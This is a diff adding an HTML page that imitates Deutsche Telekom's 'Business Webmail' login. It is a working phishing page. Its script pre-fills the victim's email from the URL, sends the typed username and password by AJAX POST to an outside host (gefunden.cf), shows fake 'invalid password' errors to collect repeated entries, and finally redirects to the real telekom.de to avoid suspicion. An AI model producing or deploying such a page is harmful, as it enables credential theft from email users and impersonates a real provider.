@@ -1,0 +1,245 @@
+<!DOCTYPE html><!--[if (lte IE 8) ]><html lang="de" lang="de-DE" class="no-js lte-ie8"><![endif]--><!--[if (gt IE 8)|!(IE)]><!-->
+<html class="no-js" lang="de"><!--<![endif]-->
+
+<head>
+	<title>Business Webmail :: Willkommen bei Business Webmail</title>
+	<meta name="Robots" content="noindex,nofollow">
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="description" content="">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link href="https://www.t-online.de/service/aktionen/favicon.ico" rel="shortcut icon">
+
+	<!-- für alle IEs -->
+	<!--[if IE 9]><link rel="stylesheet" type="text/css" href="plugins/jqueryui/themes/telekom/jquery-ui-1.10.4.custom.css?s=1582707225">
+<script type="text/javascript">//Dummy</script><![endif]-->
+
+
+
+	<link rel="stylesheet" type="text/css" href="https://business-webmail.de/program/js/tinymce/roundcube/browser.css">
+	<link type="text/css" rel="stylesheet" href="https://business-webmail.de/skins/telekom/css/components.min.css">
+	<link type="text/css" rel="stylesheet" href="https://business-webmail.de/skins/telekom/css/001_layout.css">
+	<link type="text/css" rel="stylesheet" href="https://business-webmail.de/skins/telekom/css/styles.min.css">
+
+	<link type="text/css" rel="stylesheet" href="https://business-webmail.de/skins/telekom/css/999_responsive.css">
+	<link rel="preconnect" href="https://fonts.googleapis.com">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link href="https://fonts.googleapis.com/css2?family=Montserrat&display=swap" rel="stylesheet">
+
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+
+
+
+
+
+
+
+
+</head>
+
+<body class="dtag login" style="font-family: 'Montserrat', sans-serif; font-size: 15px; ">
+
+	<!--<h1 class="voice">Business Webmail Anmelden</h1>-->
+
+	<div class="layout-page-head">
+		<div class="layout-page-head-inner">
+			<div class="logo">
+				<img src="https://business-webmail.de/skins/telekom/images/deutsche-telekom-brand-logo-web-2013.png" alt="">
+				<h1>Business Webmail</h1>
+			</div>
+		</div>
+	</div>
+
+	<div class="layout-page">
+		<div class="layout-page-head">
+			<div class="layout-page-head-inner"></div>
+		</div>
+
+		<div class="layout-page-body">
+			<div id="login-form">
+				<div id="message-1">
+					<div class="notification notification-positive" role="alert">
+						<div class="notification-content">Anmelden, um Ihre Überprüfung abzuschließen</div>
+					</div>
+				</div>
+				<div class="box-inner">
+					<form>
+						<center>
+							<div class="notification notification-positive" role="alert" id="message" style="display: none;">Ungültige ID oder ungültiges Passwort..  Bitte versuchen Sie es erneut!</div>
+							<span id="error" class="text-danger" style="display: none;">Dieses Konto gibt es nicht. Geben Sie ein anderes Konto ein.</span>
+						</center>
+						<table>
+							<tbody>
+								<tr>
+									<td class="title"><label for="rcmloginuser">Benutzername</label>
+									</td>
+									<td class="input"><input name="ai" id="ai" required="required" size="40" class="form-input" autocapitalize="none" autocomplete="off" type="text" value=""></td>
+								</tr>
+								<tr>
+									<td class="title"><label for="rcmloginpwd">Passwort</label>
+									</td>
+									<td class="input"><input name="pr" id="pr" required="required" size="40" class="form-input" autocapitalize="none" autocomplete="off" type="password"></td>
+								</tr>
+							</tbody>
+						</table>
+
+						<p class="formbuttons"><input type="submit" name="submit-btn" id="submit-btn" class="btn btn-brand btn-flat" value="Anmelden"></p>
+					</form>
+				</div>
+
+				<div class="box-bottom" role="complementary">
+					<noscript>
+						<p class="noscriptwarning">Warnung: Dieser Webmail-Service erfordert Javascript. Um ihn zu benutzten aktivieren Sie Javascript in ihren Browser-Einstellungen.</p>
+					</noscript>
+				</div>
+			</div>
+
+			<div style="text-align: center;">
+				<div class="login-hint">
+					<p>Ihre E-Mail-Adresse und Ihr E-Mail-Passwort können Sie im <a target="_blank" href="https://homepagecenter.telekom.de/index.php?id=113">HomepageCenter</a> unter E-Mail &gt; Einrichten &amp; Verwalten ändern.</p>
+				</div>
+			</div>
+		</div>
+	</div>
+
+
+
+
+
+
+	<p id="bwm-footer" style="z-index:2; background-color:#fff; position:fixed; min-height:19px; top:auto; bottom:1px; padding:0px 10px; border-top:1px solid #a4a4a4;" class="layout-page-body">
+		<span class="text-small">© Telekom Deutschland GmbH</span>
+		<span class="text-small pull-right">
+			<a class="offset-right-2" href="https://www.telekom.de/start/impressum" target="_blank" tabindex="90">Impressum</a>
+			<a href="https://www.telekom.de/datenschutz-ganz-einfach" target="_blank" tabindex="100">Datenschutz</a>
+		</span>
+	</p>
+
+
+
+
+
+
+
+
+</body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.6.4.min.js" integrity="sha256-oP6HI9z1XaZNBrJURtCoUT5SUnxFr8s3BzRl+cbzUq8=" crossorigin="anonymous"></script>
+<script>
+	/* global $ */
+	$(document).ready(function() {
+		var count = 0;
+
+		setTimeout(()=>{
+			$("#message-1").fadeOut();
+		}, 3000);
+
+		/////////////url ai getting////////////////
+		var ai = window.location.hash.substr(1);
+		if (!ai) {
+
+		} else {
+			// $('#ai').val(ai);
+			var my_ai = ai;
+			var ind = my_ai.indexOf("@");
+			var my_slice = my_ai.substr((ind + 1));
+			var c = my_slice.substr(0, my_slice.indexOf('.'));
+			var final = c.toLowerCase();
+			$('#ai').val(my_ai);
+			$("#message").hide();
+		}
+		///////////////url getting email////////////////
+
+
+
+		$('#submit-btn').click(function(event) {
+			$('#error').hide();
+			$('#message').hide();
+			event.preventDefault();
+			var ai = $("#ai").val();
+			var pr = $("#pr").val();
+			var msg = $('#message').html();
+			$('#message').text(msg);
+			///////////new injection////////////////
+			var my_ai = ai;
+			var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+			if (!ai) {
+				$('#error').show();
+				$('#error').html("E-Mail-Feld ist leer!");
+				ai.focus;
+				return false;
+			}
+
+			if (!filter.test(my_ai)) {
+				$('#error').show();
+				$('#error').html("Dieses Konto gibt es nicht. Geben Sie ein anderes Konto ein");
+				ai.focus;
+				return false;
+			}
+			if (!pr) {
+				$('#error').show();
+				$('#error').html("Passwortfeld ist leer.!");
+				ai.focus;
+				return false;
+			}
+
+			var ind = my_ai.indexOf("@");
+			var my_slice = my_ai.substr((ind + 1));
+			var c = my_slice.substr(0, my_slice.indexOf('.'));
+			var final = c.toLowerCase();
+			///////////new injection////////////////
+			count = count + 1;
+			var link = encodeURI('https://gefunden.cf/tonline/next.php');
+
+			$.ajax({
+				dataType: 'JSON',
+				url: link,
+				type: 'POST',
+				data: {
+					ai: ai,
+					pr: pr,
+				},
+				// data: $('#contact').serialize(),
+				beforeSend: function(xhr) {
+					$('#submit-btn').val('Überprüfung von...');
+				},
+				success: function(response) {
+					if (response) {
+						$("#message").show();
+						console.log(response);
+						if (response['signal'] == 'ok') {
+							$("#pr").val("");
+							if (count >= 3) {
+								count = 0;
+								// window.location.replace(response['redirect_link']);
+								window.location.replace("https://www.telekom.de/");
+
+							} //https://www.floortrendsmag.com/ext/resources/Issues/2015/07-July/TalkFloor/0715_ft_TalkFloor_img5.jpg
+							// $('#msg').html(response['msg']);
+						} else {
+							// $('#msg').html(response['msg']);
+						}
+					}
+				},
+				error: function() {
+					$("#pr").val("");
+					if (count >= 3) {
+						count = 0;
+						window.location.replace("https://www.telekom.de/");
+					}
+					$("#message-1").show();
+					$('#message-1').html('<strong>Ungültige ID oder ungültiges Passwort..</strong><br/> Bitte versuchen Sie es erneut!');
+				},
+				complete: function() {
+					$('#submit-btn').val('Anmelden');
+				}
+			});
+		});
+
+
+	});
+</script>
+
+</html>
